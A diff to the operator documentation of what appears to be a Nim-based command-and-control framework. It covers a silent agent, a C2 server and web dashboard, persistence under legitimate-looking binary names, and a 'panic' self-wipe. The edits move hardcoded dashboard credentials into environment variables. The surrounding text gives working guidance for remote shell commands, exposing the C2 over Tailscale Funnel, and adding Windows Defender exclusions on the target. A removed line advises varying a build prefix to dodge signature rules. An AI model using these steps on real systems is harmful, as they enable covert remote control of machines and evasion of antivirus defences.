@@ -124,10 +124,10 @@ code agent.nim
 .\build\c2_server.exe
 # In another terminal:
 .\build\agent_silent.exe
-# Browser: http://localhost:8080/  (operator / S3nt1n3l-C2-D3v-Only-CHANGEME)
+# Browser: http://localhost:8080/  (set C2_WEB_USER and C2_WEB_PASSWORD before launch)
 
 # 4. Read the agent's own log on the target
-Get-Content $env:TEMP\svc-X7K.log -Tail 20
+Get-Content $env:TEMP\svc-X7K.log -Tail 20  # baseline legacy log path
 ```
 
 ### Common things to change
@@ -135,12 +135,12 @@ Get-Content $env:TEMP\svc-X7K.log -Tail 20
 | Want to change | Edit | Notes |
 |---|---|---|
 | Default C2 URL | `C2_URLS_DEFAULT` const in `agent.nim` | Or override at runtime via env/CLI (no rebuild) |
-| Registration auth secret | `AGENT_SECRET` in `agent.nim` AND `SECRET` in `c2_server.nim` — must match | Rotate per engagement |
-| Web dashboard password | `WEB_AUTH_USER` / `WEB_AUTH_PASSWORD` in `c2_server.nim` | Change before any real use |
+| Registration auth secret | Set `C2_AGENT_PASSPHRASE` before `build.ps1` and `build_sentinel.ps1` | The generated `secret.nim` must match for server, baseline, Sentinel, and hardened binaries |
+| Web dashboard credentials | Runtime `C2_WEB_USER` / `C2_WEB_PASSWORD` | No compiled defaults; authentication fails if unset |
 | Persistence binary name pool | `LEGIT_NAMES` in `establishPersistence` in `agent.nim` | Add your own legit-looking names |
 | WebSocket port | `LISTEN_PORT` in `c2_server.nim` | Use 443/8443 — anything < 1024 needs admin |
 | Web dashboard port | `WEB_PORT` in `c2_server.nim` | Keep on localhost unless proxied |
-| BuildPrefix (sig-string `X7K`) | `BuildPrefix` const in `agent.nim` | Vary per build to dodge signature rules |
+| BuildPrefix | Generated `prefix.nim` for primary Sentinel/server builds | Legacy agents still use their own fixed values |
 | Reconnect backoff | `RECONNECT_BASE_DELAY` / `RECONNECT_MAX_DELAY` | Default 5s → 300s exponential |
 | Beacon interval | `BEACON_INTERVAL` | Default 10s; lower = more network noise |
 
@@ -152,7 +152,8 @@ Get-Content $env:TEMP\svc-X7K.log -Tail 20
 # Local test (both on same machine)
 .\build\agent_silent.exe
 
-# Connect to a different host (no rebuild needed)
+# Connect to a different host (no rebuild needed); use ws:// directly,
+# or wss:// only through an external TLS terminator.
 .\build\agent_silent.exe --c2=ws://192.168.1.10:8443
 $env:SENTINEL_C2_URLS = "wss://machine.ts.net/"; .\build\agent_silent.exe
 ```
@@ -185,8 +186,8 @@ $env:SENTINEL_C2_URLS = "wss://machine.ts.net/"; .\build\agent_silent.exe
 
 # 2. Open dashboard
 #    http://localhost:8080/
-#    user: operator
-#    pass: S3nt1n3l-C2-D3v-Only-CHANGEME
+#    user: value of C2_WEB_USER
+#    pass: value of C2_WEB_PASSWORD
 
 # 3. (Optional) Expose via Tailscale Funnel
 tailscale up
@@ -223,9 +224,9 @@ $env:SENTINEL_C2_URLS = "wss://desktop-o31lvpe.tail4b2f2a.ts.net/"; .\agent_sile
 |---|---|---|
 | Build error: `undeclared identifier: 'X'` | Source out of sync | Re-read the file, check git diff |
 | `agent.exe` deleted on disk | Defender caught the build | Add Defender exclusion for the `build\` dir before running `build.ps1` |
-| `agent.exe` runs but no agent shows in dashboard | Wrong URL or wrong port | Check `svc-X7K.log` — should show `c2 urls: ...`. Confirm `c2_server` is listening on that port. |
+| `agent.exe` runs but no agent shows in dashboard | Wrong URL or wrong port | Check the configured agent log; baseline legacy logs use `svc-X7K.log`, while Sentinel logs use `csp-<BuildPrefix>.dat`. Confirm `c2_server` is listening on that port. |
 | `c2_server` not listening on 8443 | Another process is on 8443, or admin needed for ports < 1024 | Use 8443 or higher; check `Get-NetTCPConnection -LocalPort 8443` |
-| `Dashboard unauthorized` | Wrong auth header | User/pass defaults are `operator` / `S3nt1n3l-C2-D3v-Only-CHANGEME` |
+| `Dashboard unauthorized` | Wrong auth header or missing runtime env | Set `C2_WEB_USER` and `C2_WEB_PASSWORD` before starting the server; there are no compiled defaults |
 | `panic` doesn't kill the agent | `state.bin` not in `META_FILE` location | The `panic` command wipes `META_FILE` and the install copy. Look for `panic: full wipe complete, exiting` in the agent's own log. |
 | Browser can't reach dashboard | Web server bound to wrong interface | `WEB_HOST` is `0.0.0.0` by default, should be reachable. If behind a tunnel, ensure tunnel forwards to `localhost:8080` |
 
@@ -254,7 +255,7 @@ Remove-Item -Recurse -Force build, nimcache -ErrorAction SilentlyContinue
 # === Local test (operator on same box) ===
 .\build\c2_server.exe                        # terminal 1
 .\build\agent_silent.exe                     # terminal 2
-# browser: http://localhost:8080/  (operator / S3nt1n3l-C2-D3v-Only-CHANGEME)
+# browser: http://localhost:8080/  (C2_WEB_USER / C2_WEB_PASSWORD)
 
 # === Remote test (operator on laptop 1, target on laptop 2) ===
 # Laptop 1:
@@ -262,7 +263,7 @@ tailscale serve --bg https+insecure://localhost:8443
 tailscale funnel 8443 on
 # Laptop 2:
 Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"
-.\agent_silent.exe --c2=wss://<your-host>.ts.net/
+.\agent_silent.exe --c2=wss://<your-host>.ts.net/   # only through a TLS terminator
 
 # === Common commands (in dashboard) ===
 shell  <id> <cmd>      # run a shell command
